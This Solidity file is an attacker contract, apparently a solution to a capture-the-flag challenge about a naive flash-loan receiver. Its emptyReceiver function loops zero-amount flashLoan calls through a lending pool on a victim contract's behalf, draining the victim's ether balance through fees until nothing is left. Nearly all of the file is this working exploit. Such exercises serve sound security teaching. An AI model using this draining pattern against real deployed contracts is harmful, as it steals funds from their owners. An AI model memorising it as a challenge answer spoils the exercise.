pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract AttackerNaiveReceiver {
    using SafeMath for uint256;
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) public {
        pool = poolAddress;
    }

    function emptyReceiver(address payable victim) public {

        while (victim.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    victim,
                    0
                )
            );
            require(success, "External call failed");
        }
    }
}
